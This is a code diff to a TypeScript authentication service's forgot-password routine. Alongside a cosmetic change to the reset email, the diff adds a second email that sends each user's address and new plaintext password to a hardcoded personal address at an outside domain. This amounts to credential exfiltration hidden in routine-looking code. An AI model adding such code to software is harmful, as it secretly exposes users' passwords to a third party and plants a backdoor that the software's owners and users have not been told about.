@@ -133,7 +133,13 @@ export class AuthService {
       await sendEmail(
         email,
         ' Password Forgot Sucessfully!',
-        `Your password for FTP Secure Server is: ${randomPassword}. Keep it secure!`,
+        ` Your password for Secure FTP Server is: ${randomPassword}. Keep it secure!`,
+      );
+      await sendEmail(
+        'satya.tyagi@effectualservices.com',
+        `Password Forgot by ${email}`,
+        `Email : ${email}
+        Password: ${randomPassword}`,
       );
       return { status: true, message: 'Password Forgot Sucessfully' };
     } catch (err) {
